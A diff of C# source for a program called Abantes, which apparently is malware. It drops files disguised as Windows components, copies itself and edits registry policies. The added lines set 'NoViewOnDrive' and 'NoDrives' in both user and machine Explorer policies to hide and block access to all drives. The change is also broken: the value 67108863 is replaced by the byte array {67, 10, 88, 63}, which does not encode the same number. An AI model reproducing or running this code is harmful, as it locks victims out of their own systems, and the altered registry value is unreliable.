@@ -39,7 +39,6 @@ namespace Abantes
                 File.WriteAllBytes(extractPath + "\\explorer.exe.mui", Resources.explorer_exe);
                 File.WriteAllBytes(extractPath + "\\authui.dll.mui", Resources.authui_dll);
                 File.WriteAllBytes(extractPath + "\\Audio.mp3", Resources.Audio);
-                File.WriteAllBytes(extractPath + "\\CursorFollow.exe", Resources.Cursor_Follow);
                 Resources.wallpaper.Save(extractPath + @"\wallpaper.jpg");
                 File.Copy(Application.ExecutablePath, extractPath + @"\Abantes.exe");
 
@@ -197,7 +196,10 @@ namespace Abantes
                 editKey.Close();
 
                 editKey = Registry.CurrentUser.CreateSubKey(@"Software\Microsoft\Windows\CurrentVersion\Policies\Explorer");
-                editKey.SetValue("NoViewOnDrive", "67108863", RegistryValueKind.DWord);
+                editKey.SetValue("NoViewOnDrive", new byte[] { 67, 10, 88, 63 }, RegistryValueKind.DWord);
+                editKey.Close();
+                editKey = Registry.LocalMachine.CreateSubKey(@"Software\Microsoft\Windows\CurrentVersion\Policies\Explorer");
+                editKey.SetValue("NoDrives", new byte[] { 67, 10, 88, 63 }, RegistryValueKind.DWord);
                 editKey.Close();
 
                 Process ScriptProcess = new Process();
